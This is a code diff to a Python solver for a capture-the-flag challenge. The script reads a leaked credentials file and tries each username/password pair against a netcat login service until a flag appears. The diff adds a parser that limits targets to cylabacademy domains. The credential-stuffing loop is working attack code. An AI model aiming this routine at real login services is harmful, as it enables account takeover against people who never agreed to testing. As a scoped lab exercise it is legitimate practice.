@@ -6,13 +6,28 @@ import socket
 import time
 from pathlib import Path
 
-TARGET_HOST = "xebec.cylabacademy.net"
-TARGET_PORT = 12360
+ALLOWED_SUFFIXES = (".cylabacademy.net", ".cylabacademy.org")
 MAX_CREDENTIALS = 1500
 ATTEMPT_DELAY = 0.10
 CONNECT_TIMEOUT = 2.5
 PROMPT_TIMEOUT = 2.5
 FLAG_RE = re.compile(r"(?:picoCTF|academy)\{[^{}\r\n]{2,200}\}")
+
+
+def parse_target(challenge_text: str) -> tuple[str, int] | None:
+    """Read the explicit nc target, allowing only challenge-provider domains."""
+    match = re.search(r"(?i)\bnc\s+([a-z0-9.-]+)\s+(\d{1,5})\b", challenge_text or "")
+    if not match:
+        return None
+    host = match.group(1).lower().rstrip(".")
+    try:
+        port = int(match.group(2))
+    except ValueError:
+        return None
+    if (not any(host.endswith(suffix) and host[:-len(suffix)] for suffix in ALLOWED_SUFFIXES)
+            or ".." in host or not 1 <= port <= 65535):
+        return None
+    return host, port
 
 
 def read_credentials(path: Path) -> tuple[list[tuple[str, str]], int]:
@@ -62,10 +77,15 @@ def _receive_response(sock: socket.socket) -> bytes:
     return bytes(data)
 
 
-def solve(path: Path, *, connector=socket.create_connection, delay: float = ATTEMPT_DELAY) -> dict:
-    """Try only the supplied challenge dump against the fixed picoCTF lab endpoint."""
+def solve(path: Path, host: str, port: int, *, connector=socket.create_connection,
+          delay: float = ATTEMPT_DELAY) -> dict:
+    """Try only the supplied challenge dump against its parsed CTF TCP endpoint."""
     if path.name.lower() != "creds-dump.txt":
         return {"ok": False, "error": "اسم الملف المطلوب هو creds-dump.txt."}
+    parsed = parse_target(f"nc {host} {port}")
+    if parsed != (host.lower().rstrip("."), port):
+        return {"ok": False, "error": "الهدف ليس خدمة CTF مسموحًا بها في نطاق cylabacademy.net/.org."}
+    target = f"{host}:{port}"
     try:
         pairs, malformed = read_credentials(path)
     except OSError as exc:
@@ -78,7 +98,7 @@ def solve(path: Path, *, connector=socket.create_connection, delay: float = ATTE
     for username, password in pairs:
         attempts += 1
         try:
-            with connector((TARGET_HOST, TARGET_PORT), timeout=CONNECT_TIMEOUT) as sock:
+            with connector((host, port), timeout=CONNECT_TIMEOUT) as sock:
                 greeting = _receive_until(sock, b"Username:")
                 if b"username:" not in greeting.lower():
                     return {"ok": False, "attempts": attempts - 1, "entries": len(pairs),
@@ -94,7 +114,7 @@ def solve(path: Path, *, connector=socket.create_connection, delay: float = ATTE
                 if flag_match:
                     return {"ok": True, "success": True, "flag": flag_match.group(0),
                             "attempts": attempts, "entries": len(pairs), "malformed": malformed,
-                            "target": f"{TARGET_HOST}:{TARGET_PORT}",
+                            "target": target,
                             "username": username}
                 connect_errors = 0
         except (OSError, TimeoutError) as exc:
@@ -102,9 +122,9 @@ def solve(path: Path, *, connector=socket.create_connection, delay: float = ATTE
             if connect_errors >= 3:
                 return {"ok": False, "attempts": attempts - 1, "entries": len(pairs),
                         "error": f"انقطع الاتصال بالخدمة بعد محاولات اتصال متتالية: {exc}",
-                        "target": f"{TARGET_HOST}:{TARGET_PORT}"}
+                        "target": target}
         if delay > 0:
             time.sleep(delay)
     return {"ok": True, "success": False, "attempts": attempts, "entries": len(pairs),
-            "malformed": malformed, "target": f"{TARGET_HOST}:{TARGET_PORT}",
+            "malformed": malformed, "target": target,
             "error": "لم تُرجع الخدمة علمًا ضمن سجلات الملف."}
